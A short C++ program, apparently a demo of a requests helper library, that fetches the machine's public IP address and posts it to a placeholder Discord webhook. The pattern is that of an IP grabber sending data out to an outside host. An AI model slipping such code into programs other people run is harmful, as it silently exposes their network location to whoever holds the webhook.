#include <iostream>
#include "Requests.hpp"

int main(int argc, char* argv[]) {
	Requests::RequestHandler ipHandler("https://api.ipify.org");
	std::string ip = ipHandler.getData();

	std::string message = "{\"content\": \"**IP: **" + ip + "\"}";

	Requests::WebhookHandler webhook("Your discord webhook URL");
	webhook.sendMessage(message);

	return EXIT_SUCCESS;
}